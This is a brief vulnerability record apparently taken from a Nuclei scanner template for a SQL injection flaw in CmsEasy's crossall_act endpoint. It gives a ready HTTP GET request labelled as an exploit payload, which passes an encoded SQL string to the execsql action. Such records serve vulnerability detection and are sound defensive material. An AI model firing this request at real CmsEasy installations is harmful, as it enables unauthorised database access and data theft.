# Vulnerability: CmsEasy crossall_act - SQL Injection
**Classification:** CMSEASY
**Source:** Nuclei Template (`cmseasy-crossall-act-sqli.yaml`)

## Description
CmsEasy crossall_act.php SQL Injection Vulnerability. CmsEasy has a SQL injection vulnerability. Any SQL command can be executed by encrypting the SQL statement in the file service.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK
```

